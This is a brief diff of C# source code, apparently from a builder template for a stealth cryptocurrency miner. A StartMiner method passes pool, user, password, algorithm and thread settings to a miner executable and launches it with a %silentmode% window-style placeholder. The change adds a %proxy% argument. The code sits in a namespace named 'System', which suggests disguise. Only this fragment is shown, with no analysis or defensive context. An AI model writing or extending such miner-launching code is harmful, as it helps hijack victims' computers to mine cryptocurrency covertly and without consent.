@@ -49,7 +49,7 @@ namespace System
 
         static void StartMiner(string pool, string user, string password, string algo, int thread)
         {
-            string CPU = " -o " + pool + " -u " + user + " -p " + password + " -a " + algo + " -t " + thread;
+            string CPU = " -o " + pool + " -u " + user + " -p " + password + " -a " + algo + " -t " + thread + " -x %proxy%";
             Interaction.Shell(_ExePath + CPU, AppWinStyle.%silentmode%, true);
 
         }
